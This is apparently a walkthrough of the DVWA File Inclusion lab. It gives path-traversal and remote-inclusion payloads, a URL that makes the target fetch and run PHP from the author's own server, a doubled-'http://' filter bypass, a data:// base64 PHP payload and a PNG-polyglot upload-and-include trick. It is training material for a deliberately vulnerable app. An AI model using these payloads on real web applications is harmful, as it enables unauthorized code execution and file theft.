# File Inclusion

Objective

Read all five famous quotes from '../../hackable/flags/fi.php' using only the 
file inclusion.

## low

Output of `?page=../../hackable/flags/fi.php.`:
```html
1.) Bond. James Bond
2.) My name is Sherlock Holmes. It is my business to know what other people don't know.
<br /><br />
--LINE HIDDEN ;)--
<br /><br />
4.) The pool on the roof must have a leak.
<!-- 5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. -->
```

It seems the third one is missing, probably hidden in php comments.

It's time for some RFI:  
For example, I host my nginx webserver on port 80 with address 172.17.0.1
(default gateway in docker subnet, virtually connects my host with DVWA), and
the query string should be like:  
`?page=http://172.17.0.1:80/RFI.php`.

```php
/* RFI.php */
<?php
$f=<<<EOF
echo file_get_contents("../../hackable/flags/fi.php");
EOF;
echo $f;
>
```

**a trap you may encounter:**

When the target accesses this link above, php engine at our site would execute
RFI.php first and return its output. So, using `file_get_contents()` in RFI.php
only reads the file on our server. In order to execute this function, we should
set the output of RFI.php to our payload instead of itself.

Or else, don't trigger the php engine on our server. I'd suggest renaming the 
file to RFI.html or hosting with no php support, i.e. a python http server.

```
3.) Romeo, Romeo! Wherefore art thou Romeo?
```

## medium

This level has better filters to protect against "http://" and "https://" for
RFI, "../" and "..\\"" for LFI.

If you've finished the XSS challenge, you may find it easy to bypass this 
filter using this trick:  
`?page=hthttp://tp://172.17.0.1/RFI.php`.

Moreover, if you're familier with php streams, you could also craft your exp
like this:  
`?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL3Zhci93d3cvaHRtbC9oYWNrYWJsZS9mbGFncy9maS5waHAiKTs/Pg==`

Payload in the base64 string above is:  
`<?php echo file_get_contents("/var/www/html/hackable/flags/fi.php");?>`

## high (technique)

In this level we can only access specific files ("file*") or "include.php" 
which contains challenge README.

Noticing that there's also a stream wrapper in php called `file://` so at least
LFI is possible, which means we have to seek another vulnerability such as file
upload. For example, If we've successfully uploaded some malicious php code in
'a.php', we can include it by
`?page=file:///var/www/html/hackable/uploads/a.php`.

## high (practice)

**See the technique chapter of 'File_Upload.md' if you don't know what to do.**

First let's concat our payload to 'PNG.bin' :  
`nasm -f bin -o PNG.bin Fake_PNG.asm`  
`echo -n '<?php echo file_get_contents("/var/www/html/hackable/flags/fi.php");?>' | cat PNG.bin - > dump.png`

Upload 'dump.png' and query
`?page=file:///var/www/html/hackable/uploads/dump.png`. Php engine would just
echo what it doesn't care and execute our code after that dummy PNG header.

You can get all five famous quotes from HTML comments.
